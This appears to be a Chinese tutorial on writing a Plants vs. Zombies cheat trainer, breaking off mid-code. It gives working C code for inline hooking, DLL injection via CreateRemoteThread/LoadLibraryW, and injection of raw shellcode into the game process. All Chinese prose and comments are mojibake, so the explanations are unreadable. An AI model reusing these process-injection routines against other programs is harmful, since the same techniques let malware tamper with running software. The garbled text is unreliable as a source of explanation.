ä¿®æ”¹ä»£ç èµ·å§‹åœ°å€ ç¡¬ç¼–ç æŒ‡é’ˆ ä»£ç å­—èŠ‚æ•°BOOL WriteProcessCodeMemory(HANDLE hProcess, LPVOID lpStartAddress, LPCVOID lpBuffer, SIZE_T nSize) { DWORD dwOldProtect; &#x2F;&#x2F;å–æ¶ˆé¡µä¿æŠ¤ if (!VirtualProtectEx(hProcess, lpStartAddress, nSize, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect)) { return FALSE; } BOOL bResult &#x3D; WriteProcessMemory(hProcess, lpStartAddress, lpBuffer, nSize, NULL);&#x2F;&#x2F;å†™å…¥ä»£ç  VirtualProtectEx(hProcess, lpStartAddress, nSize, dwOldProtect, &amp;dwOldProtect);&#x2F;&#x2F;å¼€å¯é¡µä¿æŠ¤ return bResult;} &#x2F;&#x2F;hookæŒ‡å®šåœ°å€,ç”³è¯·æ–°ç©ºé—´ä¿å­˜åŸå§‹ä»£ç å¹¶å†™å…¥hookcode,è¿”å›ç”³è¯·ç©ºé—´çš„åœ°å€LPVOID SetHook(HANDLE hProcess, LPVOID desAddr, LPCVOID hookCode, SIZE_T hookCodeSize, SIZE_T origCodeSize) { BYTE origCode[10] &#x3D; { 0 }, jmpCode[5] &#x3D; { 0xE9,0,0,0,0 }; &#x2F;&#x2F;1. è¯»å–å¹¶ä¿å­˜åŸå§‹ä»£ç  if (!ReadProcessMemory(hProcess, desAddr, origCode, origCodeSize, NULL)) return NULL; //2. ç”³è¯·ç©ºé—´ç”¨äºå­˜å‚¨åŸå§‹ä»£ç ,hookä»£ç ,jmpè¿”å›ä»£ç  LPVOID allocAddr = VirtualAllocEx(hProcess, NULL, hookCodeSize + origCodeSize + 5, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); if (!allocAddr) return NULL; //3. å‘ç”³è¯·ç©ºé—´å†™å…¥åŸå§‹ä»£ç ,hookä»£ç ,jmpè¿”å›ä»£ç  jmp xxx åç§»ä¸ºç›®çš„åœ°å€-jmpä¸‹ä¸€æ¡æŒ‡ä»¤åœ°å€ *(DWORD*)(jmpCode + 1) = (DWORD)desAddr + 5 - ((DWORD)allocAddr + hookCodeSize + origCodeSize + 5);//hookè¿”å›åœ°å€çš„åç§» if (!WriteProcessCodeMemory(hProcess, allocAddr, origCode, origCodeSize) //å†™å…¥åŸå§‹ä»£ç  || !WriteProcessCodeMemory(hProcess, (DWORD)allocAddr + origCodeSize, hookCode, hookCodeSize)//å†™å…¥hookä»£ç  || !WriteProcessCodeMemory(hProcess, (DWORD)allocAddr + origCodeSize + hookCodeSize, jmpCode, 5))//å†™å…¥jmpcode &#123; VirtualFreeEx(hProcess, allocAddr, 0, MEM_RELEASE);//å†™å…¥å¤±è´¥åˆ™é‡Šæ”¾ç©ºé—´ return NULL; &#125; //4. ä¿®æ”¹ç›®çš„åœ°å€å¤„çš„ä»£ç  jmp xxxåç§» åŸå§‹ä»£ç åæ‰æ˜¯éœ€è¦æ‰§è¡Œçš„hookä»£ç  *(DWORD*)(jmpCode + 1) = ((DWORD)allocAddr + origCodeSize) - ((DWORD)desAddr + 5); WriteProcessCodeMemory(hProcess, desAddr, jmpCode, 5);//åœ¨æºåœ°å€å¤„å†™å…¥è·³è½¬ä»£ç  if (origCodeSize &gt; 5)//åŸå§‹ä»£ç é•¿åº¦å¤§äº5æ—¶nopå¤šä½™å­—èŠ‚ &#123; BYTE nopCode[5] = &#123; 0x90,0x90,0x90,0x90,0x90 &#125;; if (!WriteProcessCodeMemory(hProcess, (DWORD)desAddr + 5, nopCode, origCodeSize - 5)) &#123; VirtualFreeEx(hProcess, allocAddr, 0, MEM_RELEASE);//å†™å…¥nopcodeå¤±è´¥åˆ™é‡Šæ”¾ç©ºé—´å¹¶è¿”å› return NULL; &#125; &#125; //5. hookæˆåŠŸåˆ™è¿”å›hookCodeæ‰€åœ¨åœ°å€ return allocAddr; } &#x2F;&#x2F;å–æ¶ˆhookæŒ‡å®šåœ°å€,å†™å›åŸå§‹ä»£ç å¹¶é‡Šæ”¾ç”³è¯·ç©ºé—´BOOL UnHook(HANDLE hProcess, LPVOID desAddr, SIZE_T origCodeSize, LPVOID allocAddr) { BYTE origCode[10] &#x3D; { 0 }; &#x2F;&#x2F;1. ä»ç”³è¯·ç©ºé—´ä¸­è¯»å‡ºåŸå§‹ä»£ç  if (!ReadProcessMemory(hProcess, allocAddr, origCode, origCodeSize, NULL)) return FALSE; &#x2F;&#x2F;2. å°†åŸå§‹ä»£ç å†™å›ç›®çš„åœ°å€ if (!WriteProcessCodeMemory(hProcess, desAddr, origCode, origCodeSize)) return FALSE; &#x2F;&#x2F;3. é‡Šæ”¾ç”³è¯·ç©ºé—´ if (!VirtualFreeEx(hProcess, allocAddr, 0, MEM_RELEASE)) return FALSE; return TRUE;}é™¤é›¾ä»£ç  å¤åˆ¶ä»£ç  éšè—ä»£ç &#x2F;&#x2F;é™¤é›¾ æ³¨æ„ä¿ç•™hookä»£ç é¦–åœ°å€LPVOID DeFogByHook(HANDLE hProcess, LPVOID BaseAddr) { unsigned char hookCode[9] = &#123; 0xc7,0x01,0x00,0x00,0x00,0x00, //mov [ecx],0 0x83,0xc1,0x04 //add ecx,0x4 &#125;; //å†™å…¥hookä»£ç è¿›è¡Œhook return SetHook(hProcess, (DWORD)BaseAddr + 0x26173, hookCode, sizeof(hookCode), 5); } &#x2F;&#x2F;æ¢å¤é›¾BOOL RecoveryFogByUnHook(HANDLE hProcess, LPVOID BaseAddr, LPVOID allocAddr) { return UnHook(hProcess, (DWORD)BaseAddr + 0x26173, 5, allocAddr);}hookå‰ æŒ‡ä»¤ä¸ºmov [ecx],edx add ecx,04 hookå æŒ‡ä»¤è¢«ä¿®æ”¹ä¸ºjmp hookcode æ–°åˆ†é…ç©ºé—´å‰5ä¸ªå­—èŠ‚æ­£æ˜¯åŸå§‹ä»£ç  ä¹‹åæ˜¯hookä»£ç å’Œjmpè¿”å›ä»£ç  ç§æ¤æ¤ç‰©åŸºæœ¬åŸç†ç¨‹åºæ˜¯æ‰§è¡Œç§æ¤æ¤ç‰©çš„å‡½æ•°åå†æ‰§è¡Œå¢åŠ æ¤ç‰©æ•°é‡çš„åŠŸèƒ½ é¦–å…ˆæŸ¥æ‰¾è‰åªä¸Šçš„æ¤ç‰©æ•°é‡,åˆå€¼0,éšç€ç§æ¤ä¸ªæ•°å¢åŠ  åŸºå€0x355E0C åç§»+868 +D4 å†æŸ¥æ‰¾æ˜¯ä»€ä¹ˆä¿®æ”¹äº†æ¤ç‰©æ•°é‡,ä¸‹æ–­ç‚¹ä¹‹åå†ç§æ¤ä¸€ä¸ªæ¤ç‰© æ–­ä¸‹åæŸ¥çœ‹è°ƒç”¨å †æ ˆä¸­çš„è¿”å›åœ°å€,å³å¯æ‰¾åˆ°ç§æ¤å‡½æ•° ![9.1 æ‰¾åˆ°ç§æ¤callå‡½æ•°](9.1 æ‰¾åˆ°ç§æ¤callå‡½æ•°.png) è¿™ä¸ªåŠŸèƒ½æœ€åˆä½¿ç”¨è¿œç¨‹çº¿ç¨‹æ³¨å…¥dllæ¥å®ç°,æ³¨å…¥dllè™½ç„¶æ¯”è¾ƒç®€å•ä½†æ˜¯å´å¹¶ä¸é€šç”¨,åœ¨æ­¤ä»…åšä»‹ç»,æ¯”è¾ƒæ¨èä½¿ç”¨è¿œç¨‹ä»£ç æ³¨å…¥çš„æ–¹å¼å®ç° è¿œç¨‹çº¿ç¨‹æ³¨å…¥dllå‡½æ•°è¿œç¨‹çº¿ç¨‹æ˜¯å½“å‰è¿›ç¨‹åœ¨ç›®æ ‡è¿›ç¨‹ä¸­åˆ›å»ºä¸€ä¸ªçº¿ç¨‹å¹¶æ‰§è¡Œç‰¹å®šä»£ç (è¿™æ®µä»£ç å¿…é¡»åœ¨ç›®æ ‡è¿›ç¨‹ä¸­è€Œä¸æ˜¯å½“å‰è¿›ç¨‹ä¸­) æ³¨å…¥dllæ˜¯å› ä¸ºdllåœ¨è¢«è¿›ç¨‹æˆ–çº¿ç¨‹åŠ è½½æ—¶æ‰§è¡Œdllçš„DllMainå‡½æ•°,é€šè¿‡è¿™ä¸€ç‰¹ç‚¹æˆ‘ä»¬å¯ä»¥å®ç°ä¸€äº›ç‰¹æ®ŠåŠŸèƒ½ ä¼˜ç‚¹: ä¾¿äºå®ç° ç¼ºç‚¹: dllæ³¨å…¥å®¹æ˜“è¢«æ£€æµ‹åˆ° åŸºæœ¬è¿‡ç¨‹: æ‰“å¼€è¿›ç¨‹è·å–è¿›ç¨‹å¥æŸ„åœ¨ç›®æ ‡è¿›ç¨‹ä¸­ç”³è¯·ç©ºé—´ç”¨äºå­˜å‚¨dllè·¯å¾„åå°†dllè·¯å¾„åå†™å…¥ç”³è¯·çš„ç©ºé—´ä¸­åˆ›å»ºè¿œç¨‹çº¿ç¨‹,æ‰§è¡ŒLoadLibraryå‡½æ•°(åŠ è½½dll)ç›®æ ‡è¿›ç¨‹åŠ è½½dllåè‡ªåŠ¨æ‰§è¡Œdllçš„DllMainå‡½æ•° å¤åˆ¶ä»£ç  éšè—ä»£ç &#x2F;&#x2F;åˆ›å»ºè¿œç¨‹çº¿ç¨‹æ–¹å¼å‘æŒ‡å®šè¿›ç¨‹æ³¨å…¥dllBOOL InjectDllByRemoteThread(DWORD desProcId,WCHAR* dllPath) { &#x2F;&#x2F;æ‰“å¼€è¿›ç¨‹è·å–è¿›ç¨‹å¥æŸ„ HANDLE hProcess &#x3D; OpenProcess(PROCESS_ALL_ACCESS, FALSE, desProcId); if (!hProcess) return FALSE; //ç”³è¯·ç©ºé—´ DWORD pathSize = (wcslen(dllPath) + 1) * 2; LPVOID newMemAddr = VirtualAllocEx(hProcess, 0, pathSize, MEM_COMMIT, PAGE_READWRITE); if (!newMemAddr) return FALSE; //å†™å…¥dllè·¯å¾„ if (!WriteProcessMemory(hProcess, newMemAddr, dllPath, pathSize, NULL)) &#123; VirtualFreeEx(hProcess, newMemAddr, 0, MEM_RELEASE); return FALSE; &#125; //åˆ›å»ºè¿œç¨‹çº¿ç¨‹ HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryW, newMemAddr, 0, NULL); if (!hThread) &#123; VirtualFreeEx(hProcess, newMemAddr, 0, MEM_RELEASE); return FALSE; &#125; WaitForSingleObject(hThread, INFINITE);//ç­‰å¾…çº¿ç¨‹ä¿¡å·,ä¿è¯æˆåŠŸæ³¨å…¥ //å›æ”¶èµ„æº VirtualFreeEx(hProcess, newMemAddr, 0, MEM_RELEASE); CloseHandle(hThread); CloseHandle(hProcess); //è¿”å›æˆåŠŸ return TRUE; }è¿œç¨‹çº¿ç¨‹å¸è½½dllå‡½æ•°å¾ˆå¤šæ•™ç¨‹åªç»™å‡ºäº†å¦‚ä½•æ³¨å…¥dll,æ²¡æœ‰æ¼”ç¤ºå¦‚ä½•å¸è½½ å¦‚æœåªæ³¨å…¥ä¸å¸è½½ä¼šå¯¼è‡´ä¸‹æ¬¡å†æ³¨å…¥æ—¶ä¸ä¼šæ‰§è¡Œç‰¹å®šå‡½æ•°(ç”±äºdllå·²ç»è¢«åŠ è½½è¿‡) ä¸æ–¹ä¾¿å®æ—¶è°ƒè¯•æ›´æ–°dllç­‰é—®é¢˜ åŸºæœ¬è¿‡ç¨‹: åœ¨ç›®æ ‡è¿›ç¨‹ç”³è¯·å†…å­˜,å°†éœ€è¦å¸è½½çš„dllæ¨¡å—åç§°å†™å…¥è¯¥å†…å­˜é€šè¿‡æšä¸¾æ¨¡å—æ¥æŸ¥æ‰¾æŒ‡å®šæ¨¡å—æˆåŠŸæŸ¥æ‰¾åˆ°dllæ¨¡å—åˆ™åˆ›å»ºè¿œç¨‹çº¿ç¨‹æ‰§è¡ŒFreeLibraryå‡½æ•°å¸è½½dll å¤åˆ¶ä»£ç  éšè—ä»£ç BOOL UnLoadDllByRemoteThread(DWORD dwProcessId, LPCWSTR lpDllName){ HANDLE hProcess &#x3D; OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId); if (hProcess &#x3D;&#x3D; NULL) return FALSE; // åœ¨ç›®æ ‡è¿›ç¨‹ä¸­ç”³è¯·ä¸€å—å†…å­˜ï¼Œå¹¶å°†éœ€è¦å¸è½½çš„DLLæ¨¡å—çš„åç§°å†™å…¥è¯¥å†…å­˜ LPVOID lpRemoteDllName = VirtualAllocEx(hProcess, NULL, (wcslen(lpDllName) + 1) * sizeof(WCHAR), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); if (lpRemoteDllName == NULL) &#123; CloseHandle(hProcess); return FALSE; &#125; if (!WriteProcessMemory(hProcess, lpRemoteDllName, lpDllName, (wcslen(lpDllName) + 1) * sizeof(WCHAR), NULL)) &#123; VirtualFreeEx(hProcess, lpRemoteDllName, 0, MEM_RELEASE); CloseHandle(hProcess); return FALSE; &#125; //æŸ¥æ‰¾dllæ¨¡å— HMODULE hModules[1024],DesModule=NULL; DWORD dwSize = 0; if (!EnumProcessModules(hProcess, hModules, sizeof(hModules), &amp;dwSize)) &#123; VirtualFreeEx(hProcess, lpRemoteDllName, 0, MEM_RELEASE); CloseHandle(hProcess); return FALSE; &#125; // éå†æ¨¡å—åˆ—è¡¨ï¼ŒæŸ¥æ‰¾éœ€è¦å¸è½½çš„DLLæ¨¡å— for (DWORD i = 0; i &lt; (dwSize / sizeof(HMODULE)); i++) &#123; WCHAR szModuleName[MAX_PATH] = &#123; 0 &#125;; if (GetModuleFileNameExW(hProcess, hModules[i], szModuleName, MAX_PATH) &gt; 0) &#123; // è·å–æ¨¡å—å¥æŸ„ if (wcsicmp(szModuleName, lpDllName) == 0) &#123; DesModule = hModules[i]; &#125; &#125; &#125; //æ²¡æœ‰æŸ¥æ‰¾åˆ°æ¨¡å— if (!DesModule) &#123; VirtualFreeEx(hProcess, lpRemoteDllName, 0, MEM_RELEASE); CloseHandle(hProcess); return FALSE; &#125; // åœ¨ç›®æ ‡è¿›ç¨‹ä¸­åˆ›å»ºè¿œç¨‹çº¿ç¨‹ï¼Œæ‰§è¡ŒFreeLibraryå‡½æ•° HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)FreeLibrary, DesModule, 0, NULL); if (hThread == NULL) &#123; VirtualFreeEx(hProcess, lpRemoteDllName, 0, MEM_RELEASE); CloseHandle(hProcess); return FALSE; &#125; // ç­‰å¾…çº¿ç¨‹æ‰§è¡Œå®Œæˆ WaitForSingleObject(hThread, INFINITE); // å…³é—­å¥æŸ„ CloseHandle(hThread); VirtualFreeEx(hProcess, lpRemoteDllName, 0, MEM_RELEASE); CloseHandle(hProcess); return TRUE; }å…³é”®dllå‡½æ•°è¿™é‡Œä½¿ç”¨äº†ä¸‰ç§æ–¹æ³• æ³¨æ„: ä¸è¦å°†ä»£ç å†™å…¥switch(reason)ä¹‹å¤–,å¦åˆ™å¯èƒ½ä¼šå¯¼è‡´å¤šæ¬¡æ‰§è¡Œ å¤åˆ¶ä»£ç  éšè—ä»£ç #include&lt;windows.h&gt;#include&lt;stdio.h&gt; &#x2F;&#x2F;è°ƒç”¨å‡½æ•°BOOL GrowPlant(DWORD BaseAddr, DWORD x, DWORD y, DWORD TypePlant) { LPVOID PlantFunc &#x3D; BaseAddr + 0x18D70; __asm { pushad push -1 &#x2F;&#x2F;-1 push TypePlant &#x2F;&#x2F;æ¤ç‰©ç±»å‹ mov eax, y &#x2F;&#x2F;y push x &#x2F;&#x2F;x mov ecx, BaseAddr mov ecx, [ecx+0x355E0C] mov ecx, [ecx + 0x868] push ecx &#x2F;&#x2F;æ¤ç‰©ç§æ¤ebp call PlantFunc popad } return TRUE;} BOOL WINAPI DllMain(HMODULE hInstance, DWORD fdwReason, LPVOID lpReserved) { DWORD BaseAddr &#x3D; GetModuleHandle(NULL); DWORD pid &#x3D; GetCurrentProcessId(); HANDLE hProcess &#x3D; OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid); LPVOID PlantFunc &#x3D; BaseAddr + 0x18D70; DWORD ebpAddr &#x3D; BaseAddr+0x355E0C,num&#x3D;0; ReadProcessMemory(hProcess, ebpAddr, &amp;ebpAddr, sizeof(DWORD), NULL); ebpAddr +&#x3D; 0x868; ReadProcessMemory(hProcess, ebpAddr, &amp;ebpAddr, sizeof(DWORD), NULL);&#x2F;&#x2F;å¿…é¡»ä½¿ç”¨å¸¦hProcesså‚æ•°çš„æ‰èƒ½æ­£ç¡®è¯»å–åˆ°åœ°å€,NULLä¸å¯ä»¥ DWORD x &#x3D; 1, y &#x3D; 1, TypePlant &#x3D; 16; //æ³¨æ„ä¸è¦å†™åˆ°switchå¤–,å¦åˆ™å¯èƒ½ä¼šä¸€æ¬¡ç§å¤šæ ªæ¤ç‰©,çŒœæµ‹æ˜¯dllè¢«å¤šä¸ªçº¿ç¨‹åŠ è½½å¯¼è‡´çš„ switch (fdwReason) &#123; case DLL_PROCESS_ATTACH: //å½“è¿›ç¨‹åŠ è½½dllæ¨¡å—æ—¶æ‰§è¡Œ //MessageBoxW(0, L&quot;ProcessAttach!&quot;, L&quot;window2&quot;, 0); //1.ç›´æ¥é€šè¿‡ä½¿ç”¨ReadProcessMemoryå‡½æ•°è¯»å–å†…å­˜è·å–ebpå‚æ•° __asm &#123; pushad push - 1 //-1 push TypePlant //æ¤ç‰©ç±»å‹ mov eax, y //y push x //x push ebpAddr //ebp call PlantFunc popad &#125; //2.é€šè¿‡åˆ©ç”¨å¯„å­˜å™¨è·å–ebp(æ¨è) x = 3, y = 2, TypePlant = 18; __asm &#123; pushad push - 1 //-1 push TypePlant //æ¤ç‰©ç±»å‹ mov eax, y //y push x //x mov ecx, BaseAddr mov ecx, [ecx+0x355E0C] mov ecx, [ecx + 0x868] push ecx call PlantFunc popad &#125; //3. é€šè¿‡è°ƒç”¨å‡½æ•°(æ¨è) GrowPlant(BaseAddr,7,3,23); break; //case DLL_THREAD_ATTACH: // printf(&quot;ThreadAttach!\\n&quot;); // break; //case DLL_THREAD_DETACH: // if (lpReserved == NULL) // &#123; // FreeLibrary(hInstance); // &#125; break; case DLL_PROCESS_DETACH: //å½“è¿›ç¨‹å¸è½½dllæ¨¡å—æ—¶æ‰§è¡Œ MessageBoxW(0, L&quot;ProcessDeTachDll!&quot;, L&quot;window2&quot;, 0); break; &#125; return TRUE; }æ‰§è¡Œç»“æœ å¤±è´¥ä»£ç è¿™æ˜¯å†™dllå‡½æ•°æ—¶é‡åˆ°çš„é—®é¢˜ å¦‚æœç›´æ¥ç”¨ mov ecx,[BaseAddr+0x355E0C]ä¼šå¯¼è‡´ä»£ç æ‰§è¡Œå¤±è´¥,æ¨æµ‹æ˜¯è¿™æ¡æŒ‡ä»¤è®¿å­˜è¿‡æ…¢æ‰€ä»¥æ— æ•ˆ å»ºè®®mov ecx,BaseAddrä¹‹åé€šè¿‡å¯¹å¯„å­˜å™¨æ“ä½œè¾¾åˆ°ç›®çš„ å¤åˆ¶ä»£ç  éšè—ä»£ç __asm { pushad push - 1 &#x2F;&#x2F;-1 push TypePlant &#x2F;&#x2F;æ¤ç‰©ç±»å‹ mov eax, y &#x2F;&#x2F;y push x &#x2F;&#x2F;x mov ecx,[BaseAddr+ 0x355E0C]&#x2F;&#x2F;è¿™æ ·ä¸è¡Œ,æ¨æµ‹æ˜¯è®¿å­˜è¿‡æ…¢ mov ecx,[ecx+0x868] mov num, ecx push ecx call PlantFunc popad }è¿œç¨‹çº¿ç¨‹ä»£ç æ³¨å…¥(æ¨è)å’Œè¿œç¨‹çº¿ç¨‹dllæ³¨å…¥ç±»ä¼¼,CreateRemoteThreadå‡½æ•°è¦æ±‚çš„å‡½æ•°åŸå‹æ˜¯ å¤åˆ¶ä»£ç  éšè—ä»£ç DWORD WINAPI ThreadProc( In LPVOID lpParameter&#x2F;&#x2F;ä½¿ç”¨CreateThreadå‡½æ•°ä¼ é€’çš„å‚æ•° è¯¥å‚æ•°æ˜¯ä¸€ä¸ªæŒ‡å‘å…¶ä»–æ•°æ®çš„æŒ‡é’ˆ,å½“ç„¶ä¹Ÿå¯ä»¥å¼ºè½¬ä¸ºå…¶ä»–ç±»å‹ç›´æ¥ä½¿ç”¨);åŸºæœ¬è¿‡ç¨‹: æ‰“å¼€è¿›ç¨‹å®šä¹‰æ³¨å…¥ä»£ç (å‡½æ•°)åœ¨ç›®æ ‡è¿›ç¨‹ä¸­ç”³è¯·ç©ºé—´å¹¶å†™å…¥æ³¨å…¥ä»£ç åˆ›å»ºè¿œç¨‹çº¿ç¨‹æ‰§è¡Œæ³¨å…¥ä»£ç (å‡½æ•°)æ‰§è¡Œå®Œæ¯•é‡Šæ”¾ç©ºé—´ å¤åˆ¶ä»£ç  éšè—ä»£ç &#x2F;&#x2F;ä»¥åˆ›å»ºè¿œç¨‹çº¿ç¨‹æ–¹å¼ç§æ¤æ¤ç‰©BOOL GrowPlantByInjectCode(DWORD dwProcessId,DWORD BaseAddr,DWORD x,DWORD y,DWORD PlantType){ BOOL bSuccess &#x3D; FALSE; &#x2F;&#x2F;1. æ‰“å¼€è¿›ç¨‹ HANDLE hProcess &#x3D; OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId); if (hProcess !&#x3D; NULL) { &#x2F;&#x2F;2. å®šä¹‰æ³¨å…¥ä»£ç (å‡½æ•°) BYTE InjectCode[50] = &#123; //æ±‡ç¼–æŒ‡ä»¤ //ä¿®æ­£ç‚¹åç§» 0x55, //0 push ebp 0x89, 0xE5, //1 mov ebp,esp 0x60, //3 pushad 0x68, 0xFF, 0xFF, 0xFF, 0xFF, //4 push -1 0x68, 0x00, 0x00, 0x00, 0x00, //9 push PlantType //10 0xB8, 0x00, 0x00, 0x00, 0x00, //14 mov eax,y //15 0x68, 0x00, 0x00, 0x00, 0x00, //19 push x //20 0xB9, 0x00, 0x00, 0x00, 0x00, //24 mov ecx,BaseAddr //25 0x8B, 0x89, 0x0C, 0x5E, 0x35, 0x00, //29 mov ecx,[ecx+0x355E0C] 0x8B, 0x89, 0x68, 0x08, 0x00, 0x00, //35 mov ecx,[ecx+0x868] 0x51, //41 push ecx 0xE8, 0x00, 0x00, 0x00, 0x00, //42 call PlantFunc //43 //è¢«è°ƒæ–¹å¹³æ ˆ 0x61, //47 popad 0xC9, //48 leave 0xC3 //49 ret &#125;; //3. ç”³è¯·ç©ºé—´ç”¨äºå­˜å‚¨ä»£ç  DWORD dwCodeSize = 50, desFunc = BaseAddr + 0x18D70; LPVOID lpRemoteCodeMem = VirtualAllocEx(hProcess, NULL, dwCodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); //4. ä¿®æ­£å‚æ•° *(DWORD*)&amp;InjectCode[10] = PlantType; *(DWORD*)&amp;InjectCode[15] = y; *(DWORD*)&amp;InjectCode[20] = x; *(DWORD*)&amp;InjectCode[25] = BaseAddr; *(DWORD*)&amp;InjectCode[43] = desFunc-((DWORD)lpRemoteCodeMem+42+5) ; //callæŒ‡ä»¤ä¸jmpç±»ä¼¼,ç›¸å¯¹äºå½“å‰æŒ‡ä»¤çš„ä¸‹ä¸€æ¡æŒ‡ä»¤è®¡ç®—åç§»,offset=des-(source+5),å‡å»callè‡ªèº«é•¿åº¦5 if (lpRemoteCodeMem != NULL) &#123; SIZE_T dwBytesWritten = 0; //5. æ³¨å…¥ä»£ç  if (WriteProcessMemory(hProcess, lpRemoteCodeMem, InjectCode, dwCodeSize, &amp;dwBytesWritten) &amp;&amp; dwBytesWritten == dwCodeSize) &#123; //6. åˆ›å»ºè¿œç¨‹çº¿ç¨‹æ‰§è¡Œä»£ç  HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpRemoteCodeMem,NULL, 0, NULL); if (hThread != NULL) &#123; //7. ç­‰å¾…çº¿ç¨‹ä¿¡å· WaitForSingleObject(hThread, INFINITE); CloseHandle(hThread); bSuccess = TRUE; &#125; &#125; //8. æ‰§è¡Œå®Œåé‡Šæ”¾ç©ºé—´ VirtualFreeEx(hProcess, lpRemoteCodeMem, 0, MEM_RELEASE); &#125; CloseHandle(hProcess); &#125; return bSuccess; }ç§æ¤åƒµå°¸åŸºæœ¬åŸç†ä¸ç§æ¤æ¤ç‰©æ€è·¯ç±»ä¼¼ é¦–å…ˆåœ¨å¤´è„‘é£æš´ä¸­é€šè¿‡ç§æ¤åƒµå°¸æ¥æ‰¾åˆ°åƒµå°¸æ•°é‡åœ°å€ ç„¶åæ‰¾åˆ°åƒµå°¸æ•°é‡å¢åŠ ä»£ç  å†é€šè¿‡æŸ¥çœ‹è°ƒç”¨å †æ ˆå’Œå‚æ•°æ‰¾åˆ°ç§æ¤åƒµå°¸call å‚æ•°åº”è¯¥ä¹Ÿæ˜¯x y type ebp (æ³¨æ„æ²¡æœ‰-1) åƒµå°¸ç§æ¤å‡½æ•°çš„xå€¼åœ¨ä¸€ä¸ªcallä¸Šæ–¹,è¿™ä¸ªcallæ˜¯ä¸ªswitchç»“æ„,æ²¡æœ‰å‚æ•°,æ‰€ä»¥xå€¼ä¹Ÿæ²¡è¢«ä¿®æ”¹ ç§æ¤åƒµå°¸å‡½æ•°â€“dllæ³¨å…¥ç‰ˆ å¤åˆ¶ä»£ç  éšè—ä»£ç BOOL GrowZombie(DWORD BaseAddr, DWORD x, DWORD y, DWORD ZombieType) { LPVOID PlantZombieFunc &#x3D; BaseAddr + 0x35390; __asm { pushad push x push ZombieType mov eax,y mov ecx,BaseAddr mov ecx,[ecx+0x355E0C] mov ecx,[ecx+0x868] mov ecx,[ecx+0x178] &#x2F;&#x2F;ebp call PlantZombieFunc popad } return TRUE;}è¿œç¨‹ä»£ç æ³¨å…¥ç‰ˆ å¤åˆ¶ä»£ç  éšè—ä»£ç &#x2F;&#x2F;ä»¥åˆ›å»ºè¿œç¨‹çº¿ç¨‹æ–¹å¼ç§æ¤åƒµå°¸BOOL GrowZombieByRemoteThread(DWORD dwProcessId,DWORD BaseAddr, DWORD x, DWORD y, DWORD ZombieType) { BOOL bSuccess = FALSE; //1. æ‰“å¼€è¿›ç¨‹ HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId); if (hProcess != NULL) &#123; //2. å®šä¹‰æ³¨å…¥ä»£ç (å‡½æ•°) BYTE InjectCode[50] = &#123; 0x55, //0 push ebp 0x89, 0xE5, //1 mov ebp,esp 0x60, //3 pushad 0x68, 0x00, 0x00, 0x00, 0x00, //4 push x 0x68, 0x00, 0x00, 0x00, 0x00, //9 push ZombieType 0xB8, 0x00, 0x00, 0x00, 0x00, //14 mov eax,y 0xB9, 0x00, 0x00, 0x00, 0x00, //19 mov ecx,BaseAddr 0x8B, 0x89, 0x0C, 0x5E, 0x35, 0x00, //24 mov ecx,[ecx+0x355E0C] 0x8B, 0x89, 0x68, 0x08, 0x00, 0x00, //30 mov ecx,[ecx+0x868] 0x8B, 0x89, 0x78, 0x01, 0x00, 0x00, //36 mov ecx,[ecx+0x178] 0xE8, 0x00, 0x00, 0x00, 0x00, //42 call PlantZombieFunc 0x61, //47 popad 0xC9, //48 leave 0xC3 //49 ret &#125;; //3. ç”³è¯·ç©ºé—´ç”¨äºå­˜å‚¨ä»£ç  DWORD dwCodeSize = 50, desFunc = BaseAddr + 0x35390; //ç§æ¤åƒµå°¸å‡½æ•° LPVOID lpRemoteCodeMem = VirtualAllocEx(hProcess, NULL, dwCodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); //4. ä¿®æ­£å‚æ•° *(DWORD*)&amp;InjectCode[5] = x; *(DWORD*)&amp;InjectCode[10] = ZombieType; *(DWORD*)&amp;InjectCode[15] = y; *(DWORD*)&amp;InjectCode[20] = BaseAddr; *(DWORD*)&amp;InjectCode[43] = desFunc - ((DWORD)lpRemoteCodeMem + 42 + 5);//callæŒ‡ä»¤ä¸jmpç±»ä¼¼,ç›¸å¯¹äºå½“å‰æŒ‡ä»¤çš„ä¸‹ä¸€æ¡æŒ‡ä»¤è®¡ç®—åç§»,è¦å‡å»callé•¿åº¦5 if (lpRemoteCodeMem != NULL) &#123; SIZE_T dwBytesWritten = 0; //5. æ³¨å…¥ä»£ç  if (WriteProcessMemory(hProcess, lpRemoteCodeMem, InjectCode, dwCodeSize, &amp;dwBytesWritten) &amp;&amp; dwBytesWritten == dwCodeSize) &#123; //6. åˆ›å»ºè¿œç¨‹çº¿ç¨‹æ‰§è¡Œä»£ç  HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpRemoteCodeMem, NULL, 0, NULL); if (hThread != NULL) &#123; //7. ç­‰å¾…çº¿ç¨‹ä¿¡å· WaitForSingleObject(hThread, INFINITE); CloseHandle(hThread); bSuccess = TRUE; &#125; &#125; //8. æ‰§è¡Œå®Œåé‡Šæ”¾ç©ºé—´ VirtualFreeEx(hProcess, lpRemoteCodeMem, 0, MEM_RELEASE); &#125; CloseHandle(hProcess); &#125; return bSuccess; }å®Œæ•´ä»£ç  å¤åˆ¶ä»£ç  éšè—ä»£ç #include&lt;stdio.h&gt;#include&lt;windows.h&gt;#include &lt;tlhelp32.h&gt;#include &lt;string.h&gt;#include &lt;shlwapi.h&gt;#include &lt;psapi.h&gt; enum Type { Sunlight, Money, TreeHeight, Chocolate, TreeFood, FlowerFood, Insecticide};unsigned int offsetTable[10] &#x3D; { 0x5578,0x50,0x11c,0x250,0x258,0x220,0x224 }; &#x2F;&#x2F; æ ¹æ®è¿›ç¨‹åè·å–è¿›ç¨‹IDDWORD GetProcessIdByName(const wchar_t* processName) { HANDLE snapshot = 